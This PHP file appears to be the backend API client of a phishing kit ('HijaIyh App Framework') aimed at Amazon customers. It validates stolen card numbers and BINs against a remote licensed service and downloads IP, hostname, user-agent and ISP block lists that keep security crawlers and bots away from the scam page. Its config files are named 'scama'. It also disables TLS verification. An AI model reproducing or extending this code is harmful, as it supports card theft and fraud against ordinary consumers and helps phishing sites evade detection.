<?php 
/** HijaIyh App Framework
* @author justalinko
* @version 2.1
**/

Class Hiapi{
    public function __construct($api_url , $acc_key,$api_key){
        $this->API_URL = $api_url;
        $this->ACCOUNT_KEY = $acc_key;
        $this->API_KEY = $api_key;
    }
    public function get($request)
    {
        $fulluris = $this->API_URL.'/index.php/api_amz/get/'.$this->ACCOUNT_KEY.'/'.$this->API_KEY.'/'.$request.'&domain='.$this->getDomain();
        $setup = [CURLOPT_URL=>$fulluris,
                  CURLOPT_USERAGENT=>'HijaIyh_App',
                  CURLOPT_RETURNTRANSFER=>true,
                  CURLOPT_SSL_VERIFYPEER=>false,
                  CURLOPT_SSL_VERIFYHOST=>false];
        $c = curl_init();
        curl_setopt_array($c,$setup);
        //exit($fulluris);
        return curl_exec($c);
        curl_close();
    }
    public function getDomain()
    {
        return preg_replace('/www\./i','',$_SERVER['SERVER_NAME']);
    }
    public function check_live($acc,$api)
    {
        $iki = new Iki64;
        $setup = [CURLOPT_URL=>$this->API_URL.'/index.php/api_amz/get/'.$acc.'/'.$api.'/config?domain='.$this->getDomain(),
                  CURLOPT_USERAGENT=>'HijaIyh_App',
                  CURLOPT_RETURNTRANSFER=>true,
                  CURLOPT_SSL_VERIFYPEER=>false,
                  CURLOPT_SSL_VERIFYHOST=>false];
        $c = curl_init();
        curl_setopt_array($c,$setup);
        $resp = curl_exec($c);
        $x = "<center><h1>";
        if(preg_match("/not found/",$resp))
        {
            $x.= "<div class='bg-warning text-dark spacer-small'>Request not found 1</div>";
        }elseif(preg_match("/status/",$resp))
        {
            $decode = $this->parse($resp);
            if($decode['status'] == 'dead')
            {
                $x.="<div class='bg-danger text-white spacer-small'>ACCOUNT KEY OR API KEY WAS WRONG !</div>";
            }elseif($decode['status'] == 'live')
            {
                $cdir = dirname(__DIR__).'/config/';

                $x.="<div class='bg-success text-white spacer-small'>SUCCESSFULLY ACTIVATED !</div>";
                file_put_contents($cdir.'scama.iyh.json',$iki->encode($decode['config'],'HijaIyh_App'));
                file_put_contents($cdir.'result.iyh.json',$iki->encode($decode['result'],'HijaIyh_App'));
                file_put_contents($cdir.'.status_hijaiyh','active');
                file_put_contents($cdir.'.account_key',$iki->encode($acc,'HijaIyh_App'));
                file_put_contents($cdir.'.api_key',$iki->encode($api,'HijaIyh_App'));
                $this->getBlocker($acc,$api);
            }
        }else{
            file_put_contents('log.txt',$resp);
            $x.= "<div class='bg-warning text-dark spacer-small'>Request not found 2</div>";
            
        }
        $x.="</h1></center>";
        return $x;
        curl_close();
    }
    public function p($data = array())
    {
       
            $p = '?';
            $x=0;
            $c = count($data)-1;
            foreach($data as $param=>$val)
            {
                $p.=$param.'='.$val;
                
                if($c != $x++)
                {
                    $p.='&';
                }
            }
        
        return $p;
    }
    public function parse($json)
    {
        return json_decode($json,true);
    }
    public function cblocker($type,$acc,$api)
    {
        $setup = [CURLOPT_URL=>$this->API_URL.'/index.php/api_amz/get/'.$acc.'/'.$api.'/blocker/'.$type.'?domain='.$this->getDomain(),
                  CURLOPT_USERAGENT=>'HijaIyh_App',
                  CURLOPT_RETURNTRANSFER=>true,
                  CURLOPT_SSL_VERIFYPEER=>false,
                  CURLOPT_SSL_VERIFYHOST=>false];
        $c = curl_init();
        curl_setopt_array($c,$setup);
        $resp = curl_exec($c);
        return $resp;
        curl_close($c);
    }
    public function getBlocker($acc,$api)
    {
        $cdir = dirname(__DIR__).'/config/';
        file_put_contents($cdir.'/ip-blacklist.iyh.txt',$this->cblocker('ip',$acc,$api));
        file_put_contents($cdir.'/hostname-block.iyh.txt',$this->cblocker('host',$acc,$api));
        file_put_contents($cdir.'/useragent-block.iyh.txt',$this->cblocker('agent',$acc,$api));
        file_put_contents($cdir.'/isp-block.iyh.txt',$this->cblocker('isp',$acc,$api));

    }
    public function config()
    {
        $s = $this->get('config');
        return $this->parse($s);
    }
    public function bin($bin)
    {
        $s = $this->get('bin'.$this->p(['bin' => $bin]));
        return $this->parse($s);     
    }
    public function country($ip)
    {
        $s = $this->get('country'.$this->p(['ip' => $ip]));
        return $this->parse($s);
    }
     public function checkCard($check)
    {
        $core = new hicore;
     $s = $this->get('valid'.$this->p(['copy' => urlencode($check), 'ip' => $core->userIP() ]));
     return $this->parse($s);   
    }
    public function crawler($ua)
    {
        $s = $this->get('crawler'.$this->p(['ua' => $ua]));
        return $this->parse($s);
    }
    public function botIp($ip)
    {
        $s = $this->get('ipcheck'.$this->p(['ip' => $ip]));
        return $this->parse($s);
    }
    public function api_tr($from,$to,$text)
    {
        $s = $this->get('translate'.$this->p(['from' => $from , 'to' => $to,'text' => $text]));
        return $this->parse($s);
    }
    public function change($type = 'result')
    {
        $s = $this->get('config');
        $d = $this->parse($s);
        $result = $iki->encode($d[$type]);
        if($type == 'config'){
            $name = 'scama';
        }elseif($type == 'result')
        {
            $name = 'result';
        }
        $fp = fopen(dirname(__DIR__).'/config/'.$name.'.iyh.json','w');
        fwrite($fp,$result);
        fclose($fp);
    }
    public function active_gak()
    {
        $s = $this->get('config');
        $d = $this->parse($s);
        if($d['status'] == 'live')
        {
            return true;
        }else{
            return false;
        }
    }
    
}